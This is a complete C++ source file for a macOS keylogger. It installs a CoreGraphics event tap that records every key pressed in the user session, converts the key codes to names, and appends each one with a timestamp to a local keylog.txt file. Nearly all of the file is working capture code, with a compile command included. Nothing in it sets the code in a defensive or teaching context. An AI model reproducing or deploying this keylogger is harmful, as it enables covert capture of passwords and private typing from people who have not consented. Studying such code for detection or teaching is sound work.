// g++ keyLogger_macOS.cpp -std=c++11 -framework ApplicationServices

#include <ApplicationServices/ApplicationServices.h>
#include <iostream>
#include <fstream>
#include <unordered_map>
#include <string>
#include <ctime>

// Global log file
std::ofstream logFile;

// Function to get the current timestamp
std::string GetTimestamp() {
    std::time_t now = std::time(nullptr);
    char buf[100];
    strftime(buf, sizeof(buf), "[%Y-%m-%d %H:%M:%S]", std::localtime(&now));
    return std::string(buf);
}

// Function to map key codes to human-readable names
std::string GetKeyName(CGKeyCode keyCode) {
    static const std::unordered_map<CGKeyCode, std::string> keyMap = {
        {0, "A"}, {1, "S"}, {2, "D"}, {3, "F"}, {4, "H"}, {5, "G"},
        {6, "Z"}, {7, "X"}, {8, "C"}, {9, "V"}, {11, "B"}, {12, "Q"},
        {13, "W"}, {14, "E"}, {15, "R"}, {16, "Y"}, {17, "T"}, {18, "1"},
        {19, "2"}, {20, "3"}, {21, "4"}, {22, "6"}, {23, "5"}, {24, "="},
        {25, "9"}, {26, "7"}, {27, "-"}, {28, "8"}, {29, "0"}, {30, "]"},
        {31, "O"}, {32, "U"}, {33, "["}, {34, "I"}, {35, "P"}, {37, "L"},
        {38, "J"}, {39, "'"}, {40, "K"}, {41, ";"}, {42, "\\"}, {43, ","},
        {44, "/"}, {45, "N"}, {46, "M"}, {47, "."}, {48, "Tab"}, {49, "Space"},
        {50, "`"}, {51, "Delete"}, {53, "Escape"}, {55, "Command"},
        {56, "Shift"}, {57, "Caps Lock"}, {58, "Option"}, {59, "Control"},
        {60, "Right Shift"}, {61, "Right Option"}, {62, "Right Control"},
        {63, "Function"}, {64, "F17"}, {65, "Numpad ."}, {67, "Numpad *"},
        {69, "Numpad +"}, {71, "Clear"}, {72, "Volume Up"}, {73, "Volume Down"},
        {74, "Mute"}, {75, "Numpad /"}, {76, "Enter"}, {77, "Numpad -"},
        {78, "F18"}, {79, "F19"}, {81, "Numpad ="},
        {82, "Numpad 0"}, {83, "Numpad 1"}, {84, "Numpad 2"},
        {85, "Numpad 3"}, {86, "Numpad 4"}, {87, "Numpad 5"},
        {88, "Numpad 6"}, {89, "Numpad 7"}, {91, "Numpad 8"},
        {92, "Numpad 9"}, {96, "F5"}, {97, "F6"}, {98, "F7"}, {99, "F3"},
        {100, "F8"}, {101, "F9"}, {103, "F11"}, {105, "F13"},
        {106, "F16"}, {107, "F14"}, {109, "F10"}, {111, "F12"},
        {113, "F15"}, {114, "Help"}, {115, "Home"}, {116, "Page Up"},
        {117, "Delete"}, {118, "F4"}, {119, "End"}, {120, "F2"},
        {121, "Page Down"}, {122, "F1"}, {123, "Left"}, {124, "Right"},
        {125, "Down"}, {126, "Up"}
    };

    auto it = keyMap.find(keyCode);
    return (it != keyMap.end()) ? it->second : "Unknown Key (" + std::to_string(keyCode) + ")";
}

// Callback function for handling keyboard events
CGEventRef keyLoggerCallback(CGEventTapProxy, CGEventType type, CGEventRef event, void*) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keyCode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

        // Log the key press with timestamp
        std::string keyName = GetKeyName(keyCode);
        logFile << GetTimestamp() << " Key Pressed: " << keyName << " (Code: " << keyCode << ")" << std::endl;
        logFile.flush(); // Ensure data is written to the file immediately
    }
    return event; // Pass the event to allow normal functionality
}

int main() {
    // Open log file in append mode
    logFile.open("keylog.txt", std::ios::out | std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file." << std::endl;
        return 1;
    }

    // Set up an event tap to capture key presses
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault,
        eventMask, keyLoggerCallback, nullptr
    );

    if (!eventTap) {
        std::cerr << "Failed to create event tap. Make sure the app has accessibility permissions." << std::endl;
        return 1;
    }

    // Create a run loop source and add it to the current run loop
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);

    // Enable the event tap
    CGEventTapEnable(eventTap, true);

    std::cout << "Keylogger started. Press Control + C to exit." << std::endl;

    // Run the loop
    CFRunLoopRun();

    // Clean up (unreachable in this example but good practice)
    CFRelease(runLoopSource);
    CFRelease(eventTap);
    logFile.close();

    return 0;
}
